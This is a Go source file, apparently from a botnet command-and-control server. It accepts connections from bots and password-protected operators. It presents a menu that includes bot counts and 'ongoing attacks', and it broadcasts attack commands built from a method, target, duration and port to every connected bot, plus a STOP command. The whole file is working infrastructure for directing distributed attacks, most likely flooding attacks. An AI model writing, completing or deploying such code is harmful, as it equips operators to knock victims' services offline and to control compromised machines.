// handlers/handlers.go
package handlers

import (
	"bufio"
	"fmt"
	"net"
	"strings"

	"cnc/models"
	"cnc/ui"
)

func StartUserServer(listener net.Listener, users []models.UserInfo, accinfo []models.AccInfo) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error Accepting User Connection:", err)
			continue
		}
		fmt.Println("Accepting User Connection:", conn.RemoteAddr())
		go HandleUserConnection(conn, users, accinfo)
	}
}

func StartBotServer(listener net.Listener) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error Accepting Bot Connection:", err)
			continue
		}
		fmt.Println("Accepting Bot Connection:", conn.RemoteAddr())
		models.BotConns = append(models.BotConns, &conn)
		go HandleBotConnection(conn)
	}
}

func HandleUserConnection(conn net.Conn, users []models.UserInfo, accinfo []models.AccInfo) {
	defer conn.Close()
	scanner := bufio.NewScanner(conn)

	for {
		ui.DisplayLoginScreen(conn)
		scanner.Scan()
		username := strings.TrimSpace(scanner.Text())

		ui.DisplayPasswordPrompt(conn)
		scanner.Scan()
		password := strings.TrimSpace(scanner.Text())

		if !authenticate(users, username, password) {
			ui.DisplayInvalidCredentials(conn)
			continue
		}

		handleMainMenu(conn, scanner, username)
	}
}

func HandleBotConnection(conn net.Conn) {
	defer conn.Close()

	models.IncrementBotCount()
	defer models.DecrementBotCount()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		// Process incoming data from the bot
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error Reading From Bot:", err)
	}
}

func handleMainMenu(conn net.Conn, scanner *bufio.Scanner, username string) {
	for {
		ui.DisplayMainMenu(conn, username, models.GetBotCount())
		scanner.Scan()
		choice := strings.TrimSpace(scanner.Text())

		switch choice {
		case "1":
			ui.DisplayBotCount(conn, models.GetBotCount())
		case "2":
			ui.DisplayRules(conn)
		case "3":
			HandleCommand(conn)
		case "4":
			ui.DisplayOngoingAttacks(conn)
		case "5":
			ui.DisplayLogoutMessage(conn)
			conn.Close()
			return
		default:
			ui.DisplayInvalidChoice(conn)
		}
	}
}

func authenticate(users []models.UserInfo, username, password string) bool {
	for _, user := range users {
		if user.Username == username && user.Password == password {
			return true
		}
	}
	return false
}

func HandleCommand(conn net.Conn) {
	scanner := bufio.NewScanner(conn)
	
	ui.DisplayCommandMenu(conn)
	scanner.Scan()
	method := strings.TrimSpace(scanner.Text())

	if method == "cancel" || method == "Cancel" {
		ui.DisplayCancelMessage(conn)
		return
	}

	if method == "STOP" || method == "stop" {
		SendToBots("STOP")
		ui.DisplayStopMessage(conn)
		return
	}

	target := ui.GetTargetInput(conn, scanner)
	if target == "cancel" || target == "Cancel" {
		ui.DisplayCancelMessage(conn)
		return
	}

	duration := ui.GetDurationInput(conn, scanner)
	port := ui.GetPortInput(conn, scanner)

	if method == "" || target == "" || duration == "" || port == "" {
		ui.DisplayMissingInputs(conn)
		return
	}

	command := fmt.Sprintf("%s %s %s %s", method, target, duration, port)
	SendToBots(command)
	ui.DisplayCommandSent(conn)
}

func SendToBots(command string) {
	for _, botConn := range models.BotConns {
		_, err := (*botConn).Write([]byte(command + "\n"))
		if err != nil {
			fmt.Println("Error Sending Command To Bot:", err)
		}
	}
}